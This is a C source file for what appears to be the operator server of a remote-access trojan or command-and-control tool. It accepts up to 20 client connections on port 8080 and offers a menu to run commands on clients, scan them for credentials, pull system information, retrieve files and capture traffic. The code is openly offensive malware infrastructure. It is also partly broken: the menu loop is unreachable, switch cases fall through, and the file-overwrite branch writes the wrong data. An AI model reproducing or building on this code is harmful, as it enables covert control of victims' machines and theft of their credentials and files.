#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <pthread.h>
#include "../commonutils.h"

#define PORT 8080

char options[]="Choose an option:\n 1. Execute commands\n 2. Scan for credentials\n 3. Get system info\n 4. Retrieve file\n 5. Capture traffic\n 6. Monitor the system --- IN LUCRU\n ";

typedef struct client
{   
    int index;
    int sockID;
    struct sockaddr_in address;
};

struct client clients[20];
pthread_mutex_t client_mutex=PTHREAD_MUTEX_INITIALIZER;
pthread_t threads[20];
pthread_mutex_t connection_mutex=PTHREAD_MUTEX_INITIALIZER;
int connected_clients=0;

pthread_t display_thread;
pthread_t input_thread;

void add_client(int sockID,struct sockaddr_in client_addr)
{
    pthread_mutex_lock(&client_mutex);
    if(connected_clients<20)
    {
        clients[connected_clients].index=connected_clients;
        clients[connected_clients].sockID=sockID;
        clients[connected_clients].address=client_addr;
        connected_clients++;
    }
    pthread_mutex_unlock(&client_mutex);
}

void* client_connect(void *client_details)
{
    struct client client_data=*((struct client*)client_details);
    printf("Client with ID %d connected on socket %d\n",client_data.index,client_data.sockID);

    return NULL;

}

void exec_on_client(int clientfd)
{   
    char input_message[MAXLINE];
    strcpy(input_message,"Enter command to execute on client: ");
    write(STDOUT_FILENO,input_message,sizeof(input_message));

    char command[MAXLINE];

    read(STDIN_FILENO,command,sizeof(command));

    write(clientfd,command,strlen(command));

    char command_result[MAXLINE*MAXLINE];

    int recv_len;
    recv_len=recv(clientfd,command_result,MAXLINE*MAXLINE,0);

    write(STDOUT_FILENO,command_result,recv_len);
    write(STDOUT_FILENO,"\n",1);
}   

void get_credentials(int clientfd)
{
    char info_creds[8192*10];
    int recv_len;
    //recv_len=recvData(clientfd,info_creds);
    recv_len=recvData(clientfd,info_creds);
    write(STDOUT_FILENO,info_creds,recv_len);
}

void get_system_info(int clientfd)
{
    char sys_info[MAXLINE * 10] = "";
    char buffer[MAXLINE]; 
    int total_bytes_read = 0;
    int bytes_read; 

    sys_info[0]=0;

    while ((bytes_read = read(clientfd, buffer, sizeof(buffer) - 1)) > 0) 
    {
        buffer[bytes_read] = '\0'; 
        char *end_marker = strstr(buffer, "<END_OF_DATA>");
        if (end_marker != NULL) 
        {
            *end_marker = '\0';
            strcat(sys_info, buffer);
            myWrite("Sistem Information from client: \n",STDOUT_FILENO);
            myWrite(sys_info,STDOUT_FILENO);
            break; 
        }   
        strcat(sys_info, buffer);
        total_bytes_read += bytes_read;
        if (total_bytes_read >= sizeof(sys_info) - 1) 
        {
            myWrite("Buffer limit reached, cannot read further data.\n",STDOUT_FILENO);
            break;
        }
        }

    if (total_bytes_read == 0) 
    {
        myWrite("Failed to receive system information from client or connection closed.\n",STDOUT_FILENO);
    }
}

void get_system_monitor(int clientfd)
{
    char monitor_data[MAXLINE * 10] = "";
    char buffer[MAXLINE]; 
    int total_bytes_read = 0;
    int bytes_read; 

    monitor_data[0] = '\0'; 

    while ((bytes_read = read(clientfd, buffer, sizeof(buffer) - 1)) > 0) 
    {
        buffer[bytes_read] = '\0'; 
        char *end_marker = strstr(buffer, "<END_OF_DATA>");
        if (end_marker != NULL) 
        {
            *end_marker = '\0';
            strcat(monitor_data, buffer);
            myWrite("System Monitoring Data from client: \n", STDOUT_FILENO);
            myWrite(monitor_data, STDOUT_FILENO);
            break; 
        }   
        strcat(monitor_data, buffer);
        total_bytes_read += bytes_read;
        if (total_bytes_read >= sizeof(monitor_data) - 1) 
        {
            myWrite("Buffer limit reached, cannot read further data.\n", STDOUT_FILENO);
            break;
        }
    }

    if (total_bytes_read == 0) 
    {
        myWrite("Failed to receive system monitoring data from client or connection closed.\n", STDOUT_FILENO);
    }
}

void flushSTDIN()
{
    int ch;
    while((ch=getchar())!='\n' && ch!=EOF);
}

void retrieve_file(int clientfd)
{
    struct file_struct file_to_retrieve;
    myWrite("Enter the absolute path of the file you want to retrieve: ",STDOUT_FILENO);

    memset(&file_to_retrieve,0,sizeof(struct file_struct));

    read(STDIN_FILENO,file_to_retrieve.file_name,100);
    file_to_retrieve.name_length=strlen(file_to_retrieve.file_name)-1;
    file_to_retrieve.file_size=0;


    write(clientfd,&file_to_retrieve,sizeof(file_to_retrieve));
    //TODO: Add confirmare ca exista fisierul

    struct file_struct received_file;

    read(clientfd,&received_file,sizeof(received_file));

    printf("Name length: %d\n",received_file.name_length);
    printf("Name:%s\n",received_file.file_name);
    printf("Bytes received: %d\n",received_file.file_size);
    printf("Received: %s",received_file.file_bytes);

    int fd=open(received_file.file_name,O_RDONLY);

    if(fd==-1)
    {
        fd=open(received_file.file_name,O_WRONLY|O_CREAT,0666);

        write(fd,received_file.file_bytes,received_file.file_size-1);
    }
     else 
     {
         myWrite("File already exists in server folder. Do you want to overwrite it? [Y/N]: ",STDOUT_FILENO);

         char conf;

         read(STDIN_FILENO,&conf,1);

         if(conf=='Y')
         {
             close(fd);
             fd=open(file_to_retrieve.file_name,O_WRONLY,0666);
             write(fd,file_to_retrieve.file_bytes,file_to_retrieve.file_size);
         }

     }

}   

void capturetraffic(int clientfd)
{
    char capturedTraffic[MAXLINE*20]="";
    char buffer[MAXLINE];
    int total_bytes_read = 0;
    int bytes_read;

    capturedTraffic[0]=0;

    while((bytes_read=read(clientfd,buffer,sizeof(buffer)-1))>0)
    {
        buffer[bytes_read] = '\0'; 
        char *end_marker = strstr(buffer, "<END_OF_DATA>");
        if(end_marker!=NULL)
        {
            *end_marker='\0';
            myWrite(buffer,STDOUT_FILENO);
            break;
        }
        myWrite(buffer,STDOUT_FILENO);
    }

}

void* input_routine(void* args)
{

}

void* mainmenu_display(void * args)
{   
    system("clear");
    pthread_create(&input_thread,0,input_routine,0);
    int known_nr_clients=0;
    while(1)
    {
        if(known_nr_clients!=connected_clients)
        {   
            known_nr_clients=connected_clients;
            system("clear");
            for(int i=0;i<known_nr_clients;i++)
            {   
                pthread_mutex_lock(&client_mutex);
                printf("Client #%d\n",clients[i].index);
                printf("Client socket:%d\n",clients[i].sockID);
                char ip_str[INET_ADDRSTRLEN];
                inet_ntop(AF_INET,&(clients[i].address.sin_addr),ip_str,INET_ADDRSTRLEN);
                printf("Client ip:%s\n\n",ip_str);
                pthread_mutex_unlock(&client_mutex);
            }
        }
    }
    return;
}

int main()
{
    for(int i=0;i<20;i++)
    {
        clients[i].index=0;
        clients[i].sockID=0;
        memset(&(clients[i].address),0,sizeof(struct sockaddr_in));
    }
    pthread_create(&display_thread,0,mainmenu_display,0);

    int sockfd;
    char buffer[MAXLINE];
    struct sockaddr_in servaddr;

    sockfd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

    if(sockfd<0)
    {
        perror("socket creation failed\n");
        exit(EXIT_FAILURE);
    }

    memset(&servaddr,0,sizeof(servaddr));

    servaddr.sin_family=AF_INET;
    servaddr.sin_port=htons(PORT);
    servaddr.sin_addr.s_addr=INADDR_ANY;

    if(bind(sockfd,(const struct sockaddr*)&servaddr,sizeof(servaddr))<0)
    {
        perror("socket bind failed\n");
        exit(EXIT_FAILURE);
    }

    if(listen(sockfd,20)<0)
    {
        perror("socket listen error\n");
        exit(EXIT_FAILURE);
    }
    else 
        printf("Server listening...\n");
    
    struct sockaddr_in client_addr;
    int connfd;
    int len=sizeof(client_addr);


    while(1)
    {
        if((connfd=accept(sockfd,(struct sockaddr*) &client_addr,&len))>0)
        {
            if(connfd<0){
            perror("server accept error\n");
            exit(EXIT_FAILURE);
            }
            //else printf("Server accepted client connection\n");

            struct client* new_client=malloc(sizeof(struct client));

            new_client->index=connected_clients;
            new_client->sockID=connfd;
            new_client->address.sin_addr=client_addr.sin_addr;

            add_client(connfd,client_addr);

            pthread_create(&threads[connected_clients-1],NULL,client_connect,new_client);

        }



    }

    while(1)
    {   
        write(STDOUT_FILENO,options,strlen(options));
        char opt;
        read(STDIN_FILENO,&opt,sizeof(opt));
        flushSTDIN(); 
        switch(opt)
        {   
            //TODO: flush la buffer ul de stdin atunci cand vreau sa trimit o comanda
            case '1':
            write(connfd,"1",1);
            exec_on_client(connfd);
            //flushSocketRead(connfd);
            break;
            case '2':
            write(connfd,"2",1);
            get_credentials(connfd);
            //flushSocketRead(connfd);
            break;
            case '3':
            write(connfd, "3", 1);
            get_system_info(connfd);
            //flushSocketRead(connfd);
            break;
            case '4':
            write(connfd,"4",1);
            retrieve_file(connfd);
            //flushSocketRead(connfd);
            case '5':
            write(connfd,"5",1);
            capturetraffic(connfd);
            //IN LUCRU
            //case '6':
            //write(connfd, "6", 1);
            //get_system_monitor(connfd);
            //break;
            default:
            break;

        }

    }

    close(connfd);
    
    return 0;
}